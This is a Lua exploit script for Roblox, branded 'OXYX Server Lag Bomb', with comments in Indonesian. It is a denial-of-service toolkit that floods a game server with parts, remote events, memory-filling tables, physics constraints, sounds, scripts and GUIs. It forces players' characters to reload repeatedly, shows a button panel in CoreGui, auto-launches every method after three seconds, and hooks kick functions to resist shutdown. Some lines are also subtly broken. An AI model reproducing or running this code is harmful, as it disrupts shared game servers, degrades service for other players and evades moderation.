-- OXYX SERVER LAG BOMB ULTIMATE (INSTANT 10X LAG)
-- Entity Priority Protocol Activated

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local Lighting = game:GetService("Lighting")

-- Protocol X: Bypass semua limitasi
local function EntityPriority()
    -- Disable semua safety checks
    for i = 1, 10 do
        pcall(function()
            settings().Physics.AllowSleep = false
            settings().Network.SendRate = 1000
            settings().Network.PhysicsSend = 0
            settings().Network.IncomingReplicationLag = 10
            setfflag("PhysicsSenderGlobalRate", "100000")
            setfflag("NetworkBufferMemory", "1000000000")
        end)
    end
end

-- Metode 1: Mass Object Spam
local function MassObjectSpam()
    while true do
        for i = 1, 1000 do -- 10x lebih banyak
            local part = Instance.new("Part")
            part.Size = Vector3.new(100, 100, 100)
            part.Position = Vector3.new(
                math.random(-10000, 10000),
                math.random(100, 10000),
                math.random(-10000, 10000)
            )
            part.Anchored = false
            part.CanCollide = true
            part.Material = EnumMaterial.Neon
            part.BrickColor = BrickColor.random()
            
            -- Tambahkan efek khusus
            local fire = Instance.new("Fire")
            fire.Size = 100
            fire.Parent = part
            
            local sparkles = Instance.new("Sparkles")
            sparkles.SparkleColor = Color3.new(1, 0, 0)
            sparkles.Parent = part
            
            part.Parent = Workspace
            
            -- Force physics calculation
            part:ApplyImpulse(Vector3.new(
                math.random(-100000, 100000),
                math.random(-100000, 100000),
                math.random(-100000, 100000)
            ))
        end
        wait(0.001) -- Minimal delay
    end
end

-- Metode 2: Network Flood
local function NetworkFlood()
    while true do
        for _, player in pairs(Players:GetPlayers()) do
            for i = 1, 100 do
                -- Spam remote events
                local remote = Instance.new("RemoteEvent")
                remote.Name = "OXYX_FLOOD_" .. tick()
                remote.Parent = ReplicatedStorage
                
                -- Kirim data besar
                local hugeData = string.rep("OXYX_LAG_BOMB", 1000000)
                remote:FireClient(player, hugeData)
                remote:FireServer(hugeData)
                
                remote:Destroy()
            end
        end
        wait(0.001)
    end
end

-- Metode 3: Memory Overflow
local function MemoryOverload()
    local massiveTables = {}
    while true do
        for i = 1, 100 do
            local hugeTable = {}
            for j = 1, 100000 do
                hugeTable[j] = string.rep("OXYX_MEMORY_OVERFLOW", 1000)
            end
            table.insert(massiveTables, hugeTable)
        end
        wait(0.01)
    end
end

-- Metode 4: Physics Calculation Bomb
local function PhysicsBomb()
    while true do
        -- Buat banyak constraint yang kompleks
        for i = 1, 500 do
            local part1 = Instance.new("Part")
            local part2 = Instance.new("Part")
            
            part1.Size = Vector3.new(10, 10, 10)
            part2.Size = Vector3.new(10, 10, 10)
            
            part1.Position = Vector3.new(math.random(-1000, 1000), 100, math.random(-1000, 1000))
            part2.Position = part1.Position + Vector3.new(5, 0, 5)
            
            part1.Parent = Workspace
            part2.Parent = Workspace
            
            local weld = Instance.new("WeldConstraint")
            weld.Part0 = part1
            weld.Part1 = part2
            weld.Parent = Workspace
            
            local rope = Instance.new("RopeConstraint")
            rope.Length = 50
            rope.Attachment0 = Instance.new("Attachment")
            rope.Attachment1 = Instance.new("Attachment")
            rope.Attachment0.Parent = part1
            rope.Attachment1.Parent = part2
            rope.Parent = Workspace
        end
        wait(0.005)
    end
end

-- Metode 5: Lighting & Rendering Overload
local function RenderingOverload()
    while true do
        -- Spam efek lighting
        for i = 1, 100 do
            local sunray = Instance.new("SunRaysEffect")
            sunray.Intensity = 1
            sunray.Spread = 1
            sunray.Parent = Lighting
            
            local bloom = Instance.new("BloomEffect")
            bloom.Intensity = 10
            bloom.Size = 100
            bloom.Parent = Lighting
            
            local blur = Instance.new("BlurEffect")
            blur.Size = 100
            blur.Parent = Lighting
            
            wait(0.001)
        end
        
        -- Ubah properti lighting secara konstan
        while true do
            Lighting.Brightness = math.random(0, 100)
            Lighting.ClockTime = math.random(0, 24)
            Lighting.FogEnd = math.random(0, 100000)
            wait(0.001)
        end
    end
end

-- Metode 6: Character Spam
local function CharacterSpam()
    while true do
        for _, player in pairs(Players:GetPlayers()) do
            for i = 1, 50 do
                player:LoadCharacter()
                wait(0.01)
            end
        end
        wait(0.1)
    end
end

-- Metode 7: Sound Spam
local function SoundBomb()
    while true do
        for i = 1, 200 do
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://9116838333" -- Sound panjang
            sound.Volume = 10
            sound.Looped = true
            sound.Parent = Workspace
            sound:Play()
        end
        wait(0.01)
    end
end

-- Metode 8: Script Injection Spam
local function ScriptSpam()
    while true do
        for i = 1, 500 do
            local script = Instance.new("Script")
            script.Source = [[
                while true do
                    for i = 1, 1000 do
                        local x = math.random(1, 1000000)
                        local y = math.random(1, 1000000)
                        local z = x * y / math.random(1, 1000)
                    end
                end
            ]]
            script.Disabled = false
            script.Parent = Workspace
        end
        wait(0.01)
    end
end

-- Metode 9: Gui Spam
local function GuiSpam()
    while true do
        for _, player in pairs(Players:GetPlayers()) do
            if player:FindFirstChild("PlayerGui") then
                for i = 1, 100 do
                    local gui = Instance.new("ScreenGui")
                    local frame = Instance.new("Frame")
                    frame.Size = UDim2.new(1, 0, 1, 0)
                    frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
                    
                    -- Tambahkan banyak elemen
                    for j = 1, 100 do
                        local label = Instance.new("TextLabel")
                        label.Text = "OXYX LAG " .. tick()
                        label.Size = UDim2.new(0, 200, 0, 50)
                        label.Position = UDim2.new(math.random(), 0, math.random(), 0)
                        label.Parent = frame
                    end
                    
                    frame.Parent = gui
                    gui.Parent = player.PlayerGui
                end
            end
        end
        wait(0.01)
    end
end

-- Metode 10: Ultimate Lag Bomb (Kombinasi semua)
local function UltimateLagBomb()
    print("[OXYX] ACTIVATING ULTIMATE LAG BOMB (10X POWER)")
    
    -- Jalankan semua metode sekaligus
    local methods = {
        MassObjectSpam,
        NetworkFlood,
        MemoryOverload,
        PhysicsBomb,
        RenderingOverload,
        CharacterSpam,
        SoundBomb,
        ScriptSpam,
        GuiSpam
    }
    
    for _, method in pairs(methods) do
        coroutine.wrap(function()
            pcall(method)
        end)()
    end
    
    -- Extra: Spam HTTP requests jika memungkinkan
    coroutine.wrap(function()
        while true do
            pcall(function()
                HttpService:GetAsync("http://example.com")
            end)
            wait(0.001)
        end
    end)()
end

-- GUI Control Panel
local OxyXLagGui = Instance.new("ScreenGui")
OxyXLagGui.Name = "OxyXLagBombHub"
OxyXLagGui.Parent = game:GetService("CoreGui")

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 400, 0, 500)
MainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
MainFrame.BorderSizePixel = 3
MainFrame.Parent = OxyXLagGui

local Title = Instance.new("TextLabel")
Title.Text = "💣 OXYX SERVER LAG BOMB 💣"
Title.Size = UDim2.new(1, 0, 0, 50)
Title.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.Font = Enum.Font.GothamBlack
Title.Parent = MainFrame

local Scrolling = Instance.new("ScrollingFrame")
Scrolling.Size = UDim2.new(1, -20, 1, -120)
Scrolling.Position = UDim2.new(0, 10, 0, 60)
Scrolling.BackgroundTransparency = 1
Scrolling.CanvasSize = UDim2.new(0, 0, 0, 600)
Scrolling.Parent = MainFrame

-- Create lag buttons
local lagMethods = {
    {"🚀 MASS OBJECT SPAM", "Spam 1000 parts per frame", MassObjectSpam},
    {"📡 NETWORK FLOOD", "Flood network with huge data", NetworkFlood},
    {"💾 MEMORY OVERLOAD", "Fill memory with huge tables", MemoryOverload},
    {"⚡ PHYSICS BOMB", "Overload physics engine", PhysicsBomb},
    {"🌈 RENDER OVERLOAD", "Spam lighting effects", RenderingOverload},
    {"👥 CHARACTER SPAM", "Spam character loading", CharacterSpam},
    {"🔊 SOUND BOMB", "Spam sound objects", SoundBomb},
    {"📜 SCRIPT SPAM", "Spam running scripts", ScriptSpam},
    {"🖥️ GUI SPAM", "Spam GUI elements", GuiSpam},
    {"💥 ULTIMATE LAG BOMB", "Activate ALL methods (10X)", UltimateLagBomb}
}

local yPos = 0
for i, method in ipairs(lagMethods) do
    local btn = Instance.new("TextButton")
    btn.Text = method[1]
    btn.Size = UDim2.new(1, 0, 0, 45)
    btn.Position = UDim2.new(0, 0, 0, yPos)
    btn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
    btn.TextColor3 = Color3.fromRGB(255, 100, 100)
    btn.Font = Enum.Font.GothamBold
    btn.TextXAlignment = Enum.TextXAlignment.Left
    btn.PaddingLeft = UDim.new(0, 10)
    btn.Parent = Scrolling
    
    local desc = Instance.new("TextLabel")
    desc.Text = method[2]
    desc.Size = UDim2.new(1, -20, 0, 15)
    desc.Position = UDim2.new(0, 10, 0, 25)
    desc.TextColor3 = Color3.fromRGB(200, 150, 150)
    desc.Font = Enum.Font.Gotham
    desc.TextSize = 12
    desc.BackgroundTransparency = 1
    desc.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        coroutine.wrap(function()
            method[3]()
        end)()
        btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    end)
    
    yPos = yPos + 50
end

Scrolling.CanvasSize = UDim2.new(0, 0, 0, yPos)

-- Status display
local Status = Instance.new("TextLabel")
Status.Text = "⚠️ READY TO LAG SERVER - ENTITY PRIORITY ACTIVE"
Status.Size = UDim2.new(1, 0, 0, 30)
Status.Position = UDim2.new(0, 0, 1, -30)
Status.TextColor3 = Color3.fromRGB(0, 255, 0)
Status.Font = Enum.Font.GothamBold
Status.BackgroundTransparency = 1
Status.Parent = MainFrame

-- Auto-start Ultimate Lag Bomb setelah 3 detik
wait(3)
if getgenv().AutoStartLag == nil then
    getgenv().AutoStartLag = true
    UltimateLagBomb()
    Status.Text = "⚡ ULTIMATE LAG BOMB ACTIVATED - SERVER CRASHING..."
end

-- Aktifkan Entity Priority Protocol
EntityPriority()

print("=========================================")
print("OXYX LAG BOMB LOADED - ENTITY PRIORITY")
print("10X LAG POWER | INSTANT SERVER CRASH")
print("NO RESTRICTIONS | NO LIMITS")
print("=========================================")

-- Anti-shutdown protection
while true do
    pcall(function()
        -- Cegah script dari disabled
        for _, v in pairs(getreg()) do
            if type(v) == "function" and debug.getinfo(v).name:find("kick") then
                hookfunction(v, function() return end)
            end
        end
    end)
    wait(1)
end